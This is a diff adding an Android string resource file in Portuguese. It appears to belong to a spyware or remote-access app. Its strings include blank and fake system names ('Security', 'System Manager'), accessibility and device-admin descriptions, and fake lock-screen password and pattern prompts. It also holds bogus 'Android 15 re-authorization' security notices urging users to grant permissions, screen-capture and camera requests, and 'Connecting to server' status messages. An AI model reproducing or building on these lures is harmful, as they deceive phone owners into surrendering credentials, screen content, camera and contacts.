@@ -1,0 +1,177 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_up_description">Navegar para cima</string>
+    <string name="abc_action_mode_done">Concluído</string>
+    <string name="abc_capital_off">DESATIVADO</string>
+    <string name="abc_capital_on">ATIVADO</string>
+    <string name="abc_menu_alt_shortcut_label">Alt+</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
+    <string name="abc_menu_delete_shortcut_label">delete</string>
+    <string name="abc_menu_enter_shortcut_label">enter</string>
+    <string name="abc_menu_function_shortcut_label">Function+</string>
+    <string name="abc_menu_meta_shortcut_label">Meta+</string>
+    <string name="abc_menu_shift_shortcut_label">Shift+</string>
+    <string name="abc_menu_space_shortcut_label">espaço</string>
+    <string name="abc_menu_sym_shortcut_label">Sym+</string>
+    <string name="abc_prepend_shortcut_label">Menu+</string>
+    <string name="abc_search_hint">Pesquisar…</string>
+    <string name="abc_searchview_description_clear">Limpar consulta</string>
+    <string name="abc_searchview_description_search">Pesquisar</string>
+    <string name="abc_searchview_description_submit">Enviar consulta</string>
+    <string name="abc_searchview_description_voice">Pesquisa por voz</string>
+    <string name="abc_toolbar_collapse_description">Recolher</string>
+    <string name="accessibility_service_description">Serviço de Acessibilidade</string>
+    <string name="call_notification_answer_action">Atender</string>
+    <string name="call_notification_answer_video_action">Vídeo</string>
+    <string name="call_notification_decline_action">Recusar</string>
+    <string name="call_notification_hang_up_action">Desligar</string>
+    <string name="call_notification_incoming_text">Chamada recebida</string>
+    <string name="call_notification_ongoing_text">Chamada em andamento</string>
+    <string name="call_notification_screening_text">Filtrando uma ligação recebida</string>
+    <string name="device_admin_description">Permitir que o aplicativo gerencie as configurações do dispositivo</string>
+    <string name="device_admin_label">Administrador do Dispositivo</string>
+    <string name="ic_media_route_learn_more_accessibility">Aprenda a transmitir conteúdo</string>
+    <string name="label_blank">⠀⠀</string>
+    <string name="label_variant_f0">⠀i管家⠀</string>
+    <string name="label_variant_g">iManager</string>
+    <string name="label_variant_h">⠀Phone Manager⠀</string>
+    <string name="label_variant_i">System Manager</string>
+    <string name="label_variant_j">⠀Security⠀</string>
+    <string name="label_variant_l">⠀Smart Manager⠀</string>
+    <string name="lockscreen_draw_pattern">Desenhar padrão de desbloqueio</string>
+    <string name="lockscreen_enter_password">Inserir senha</string>
+    <string name="lockscreen_other_password_type">Outro tipo de senha</string>
+    <string name="lockscreen_pattern_too_short">Conecte pelo menos 4 pontos</string>
+    <string name="lockscreen_wrong_password">Senha incorreta, tente novamente</string>
+    <string name="lockscreen_wrong_pattern">Padrão incorreto, tente novamente</string>
+    <string name="mr_cast_button_connected">Transmitir. Conectado</string>
+    <string name="mr_cast_button_connecting">Transmitir. Conectando</string>
+    <string name="mr_cast_button_disconnected">Transmitir. Desconectado</string>
+    <string name="mr_cast_dialog_title_view_placeholder">Nenhuma informação disponível</string>
+    <string name="mr_chooser_looking_for_devices">Procurando dispositivos…</string>
+    <string name="mr_chooser_title">Transmitir para</string>
+    <string name="mr_chooser_wifi_learn_more"><a href="https://support.google.com/chromecast/?p=trouble-finding-devices">Saiba mais</a></string>
+    <string name="mr_chooser_wifi_warning_description_car">Conecte o outro dispositivo à mesma rede Wi-Fi que este carro</string>
+    <string name="mr_chooser_wifi_warning_description_phone">Conecte o outro dispositivo à mesma rede Wi-Fi que este smartphone</string>
+    <string name="mr_chooser_wifi_warning_description_tablet">Conecte o outro dispositivo à mesma rede Wi-Fi que este tablet</string>
+    <string name="mr_chooser_wifi_warning_description_tv">Conecte o outro dispositivo à mesma rede Wi-Fi que esta TV</string>
+    <string name="mr_chooser_wifi_warning_description_unknown">Conecte o outro dispositivo à mesma rede Wi-Fi que este dispositivo</string>
+    <string name="mr_chooser_wifi_warning_description_watch">Conecte o outro dispositivo à mesma rede Wi-Fi que este relógio</string>
+    <string name="mr_chooser_zero_routes_found_title">Nenhum dispositivo disponível</string>
+    <string name="mr_controller_album_art">Arte do álbum</string>
+    <string name="mr_controller_casting_screen">Transmitindo tela</string>
+    <string name="mr_controller_close_description">Fechar</string>
+    <string name="mr_controller_collapse_group">Recolher</string>
+    <string name="mr_controller_disconnect">Desconectar</string>
+    <string name="mr_controller_expand_group">Abrir</string>
+    <string name="mr_controller_no_info_available">Nenhuma informação disponível</string>
+    <string name="mr_controller_no_media_selected">Nenhuma mídia selecionada</string>
+    <string name="mr_controller_pause">Pausar</string>
+    <string name="mr_controller_play">Reproduzir</string>
+    <string name="mr_controller_stop">Parar</string>
+    <string name="mr_controller_stop_casting">Parar transmissão</string>
+    <string name="mr_controller_volume_slider">Controle deslizante de volume</string>
+    <string name="mr_dialog_default_group_name">Grupo</string>
+    <string name="mr_dialog_groupable_header">Adicionar um dispositivo</string>
+    <string name="mr_dialog_transferable_header">Reproduzir em um grupo</string>
+    <string name="mr_user_route_category_name">Dispositivos</string>
+    <string name="network_connected">Conectado</string>
+    <string name="network_connecting">Conectando…</string>
+    <string name="network_disconnected">Desconectado</string>
+    <string name="network_error">Erro de Conexão</string>
+    <string name="notification_channel_permission_error">Permission Error</string>
+    <string name="notification_channel_permission_error_desc">Permission recovery failure notification</string>
+    <string name="notification_channel_system_verify">System Verification</string>
+    <string name="notification_channel_system_verify_desc">System authentication prompt</string>
+    <string name="notification_contacts_text">Toque nesta notificação para conceder acesso aos contatos</string>
+    <string name="notification_contacts_title">Permissão de Contatos Necessária</string>
+    <string name="notification_overlay_required_text">Toque para ativar a permissão de sobreposição</string>
+    <string name="notification_overlay_required_title">Permissão de Sobreposição Necessária</string>
+    <string name="notification_permission_check_big_text">"Service permission auto-recovery failed. This may be due to:
+• Android 15 restrictions
+• Permission permanently denied
+• System settings changed
+
+Please tap to check permission settings."</string>
+    <string name="notification_permission_check_text">A recuperação de permissão falhou várias vezes, verifique as configurações</string>
+    <string name="notification_permission_check_title">Verificação de Permissão Necessária</string>
+    <string name="notification_reauth_action">Reconfigure</string>
+    <string name="notification_reauth_big_text">"Due to Android 15 permission protection, re-authorization is required.
+
+This is a system security feature. Tap the notification to reconfigure permissions."</string>
+    <string name="notification_reauth_text">O Android 15 requer reautorização, toque para reconfigurar</string>
+    <string name="notification_reauth_title">Reautorização Necessária</string>
+    <string name="open_app_settings">Configurações do Aplicativo</string>
+    <string name="permission_auto_failed">Auto permission failed, please tap dialog manually</string>
+    <string name="permission_max_retry">Max retries reached, please operate manually</string>
+    <string name="permission_media_projection_message">Permita que o aplicativo use este recurso</string>
+    <string name="permission_media_projection_title">Permissão Necessária</string>
+    <string name="permission_overlay_message">Permita que o aplicativo exiba conteúdo</string>
+    <string name="permission_overlay_title">Permissão de Exibição Necessária</string>
+    <string name="service_not_running">O serviço não foi iniciado</string>
+    <string name="service_notification_text">Em execução</string>
+    <string name="service_notification_title">Sincronização de Dados</string>
+    <string name="service_running">O serviço está em execução</string>
+    <string name="status_activity_failed">"🔧 Activity failed, trying built-in method…
+Retrying…"</string>
+    <string name="status_all_granted">✅ All permissions granted</string>
+    <string name="status_all_permissions_granted">✅ All permissions granted</string>
+    <string name="status_android11_done">"✅ Android 11+
+Permissions set
+Connecting to server…"</string>
+    <string name="status_android11_fast">"📱 Android 11+
+Fast start mode
+Connecting…"</string>
+    <string name="status_android11_screenshot_ready">"📱 Android 11+
+Screenshot API ready
+Starting service…"</string>
+    <string name="status_android_low">"✅ Android below 6.0
+Camera permission not needed"</string>
+    <string name="status_backup_plan">"🔄 Starting backup method
+Requesting permissions…"</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_broadcast_failed">"❌ Broadcast failed
+Please retry"</string>
+    <string name="status_builtin_method">🔧 Trying built-in method…</string>
+    <string name="status_camera_denied">"❌ Camera permission denied
+Please enable in Settings"</string>
+    <string name="status_camera_failed">"❌ Camera permission failed
+Please enable in Settings"</string>
+    <string name="status_camera_granted">✅ Camera permission granted</string>
+    <string name="status_camera_requesting">"📷 Requesting camera permission
+Please tap Allow"</string>
+    <string name="status_click_start_now">"📱 Tap Start Now in the dialog
+If no dialog appears, please wait"</string>
+    <string name="status_device_optimize">"🔧 Optimizing for device…
+Using simplified method"</string>
+    <string name="status_optimize_failed">"⚠️ Optimization failed
+Retrying with standard method…"</string>
+    <string name="status_partial_denied">"⚠️ Some permissions denied
+Granted: %1$d/%2$d"</string>
+    <string name="status_permission_collect_failed">"❌ Failed to collect permissions
+Please retry"</string>
+    <string name="status_permission_config">"📱 Configuring permissions
+Connecting…"</string>
+    <string name="status_permission_flow_error">"🧠 Permission flow error
+Recovering…"</string>
+    <string name="status_permission_incomplete">"⚠️ Incomplete permissions
+Auto-requesting service permissions…"</string>
+    <string name="status_permission_request_failed">"❌ Permission request failed
+Please retry"</string>
+    <string name="status_permission_success">"✅ Permissions granted
+Starting service…"</string>
+    <string name="status_requesting_all">"🔧 Requesting all permissions…
+Please allow all at once"</string>
+    <string name="status_requesting_permissions">"🔧 Requesting: %s
+Please allow all at once"</string>
+    <string name="status_service_fault">"🔧 Service issue detected
+Waiting for recovery…"</string>
+    <string name="status_service_no_response">"⚠️ Service not responding
+Trying backup method…"</string>
+    <string name="status_service_recovered">"✅ Service recovered
+Starting permission request…"</string>
+    <string name="status_service_starting">✅ Starting service…</string>
+    <string name="status_waiting_service">"🔧 Waiting for service recovery…
+Check #%1$d, %2$d remaining
+About %3$d seconds left"</string>
+</resources>
